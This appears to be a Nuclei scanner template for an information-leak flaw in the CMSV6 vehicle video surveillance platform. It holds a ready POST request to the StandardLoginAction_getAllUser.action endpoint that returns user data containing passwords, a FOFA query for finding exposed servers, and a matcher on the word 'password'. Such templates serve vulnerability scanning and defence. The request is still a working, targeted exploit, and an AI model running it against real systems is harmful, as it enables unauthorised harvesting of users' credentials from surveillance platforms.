id: g-sky_CMSV6_StandardLoginAction_getAllUser_information_leakage

info:
  name: g-sky_CMSV6_StandardLoginAction_getAllUser_information_leakage
  author: HK
  severity: high
  description: 通天星CMSV6车载视频监控平台/808gps/StandardLoginAction_getAllUser.action存在信息泄露漏洞
  metadata:
    max-request: 1
    Fofa-query: body="/808gps/"
    verified: true

http:
- raw:
  - |-
    @timeout: 30s
    POST /808gps/StandardLoginAction_getAllUser.action HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
    Connection: close
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    Accept-Encoding: gzip, deflate
    Content-Length: 9

    json=null

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - password